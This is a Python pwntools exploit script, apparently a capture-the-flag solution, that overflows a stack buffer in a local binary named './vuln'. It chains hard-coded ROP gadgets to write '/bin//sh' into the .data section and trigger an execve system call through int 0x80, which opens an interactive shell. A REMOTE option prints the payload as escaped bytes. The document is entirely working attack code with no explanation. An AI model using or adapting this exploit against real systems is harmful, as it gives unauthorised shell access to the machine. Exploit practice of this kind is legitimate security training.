from pwn import *
from struct import pack

def escapeString(payload):
    return '{}'.format(''.join(['\\x{:02x}'.format(ord(c)) for c in payload]))

payload = b'A' * 28
payload += pack('<I', 0x0806ee6b) # pop edx ; ret
payload += pack('<I', 0x080da060) # @ .data
payload += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
payload += '/bin'
payload += pack('<I', 0x080da060) # padding without overwrite edx
payload += pack('<I', 0x41414141) # padding
payload += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x0806ee6b) # pop edx ; ret
payload += pack('<I', 0x080da064) # @ .data + 4
payload += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
payload += '//sh'
payload += pack('<I', 0x080da064) # padding without overwrite edx
payload += pack('<I', 0x41414141) # padding
payload += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x0806ee6b) # pop edx ; ret
payload += pack('<I', 0x080da068) # @ .data + 8
payload += pack('<I', 0x08056420) # xor eax, eax ; ret
payload += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x080481c9) # pop ebx ; ret
payload += pack('<I', 0x080da060) # @ .data
payload += pack('<I', 0x0806ee92) # pop ecx ; pop ebx ; ret
payload += pack('<I', 0x080da068) # @ .data + 8
payload += pack('<I', 0x080da060) # padding without overwrite ebx
payload += pack('<I', 0x0806ee6b) # pop edx ; ret
payload += pack('<I', 0x080da068) # @ .data + 8
payload += pack('<I', 0x08056420) # xor eax, eax ; ret
payload += pack('<I', 0x0807c2fa) # inc eax ; ret
payload += pack('<I', 0x0807c2fa) # inc eax ; ret
payload += pack('<I', 0x0807c2fa) # inc eax ; ret
payload += pack('<I', 0x0807c2fa) # inc eax ; ret
payload += pack('<I', 0x0807c2fa) # inc eax ; ret
payload += pack('<I', 0x0807c2fa) # inc eax ; ret
payload += pack('<I', 0x0807c2fa) # inc eax ; ret
payload += pack('<I', 0x0807c2fa) # inc eax ; ret
payload += pack('<I', 0x0807c2fa) # inc eax ; ret
payload += pack('<I', 0x0807c2fa) # inc eax ; ret
payload += pack('<I', 0x0807c2fa) # inc eax ; ret
payload += pack('<I', 0x08049563) # int 0x80

if args['REMOTE']:
    print(escapeString(payload))
    quit()

p = process('./vuln')

# Uncomment for debugging
# gdb.attach(p)

print(p.recvuntil('?').decode())

p.sendline(payload)
p.interactive()
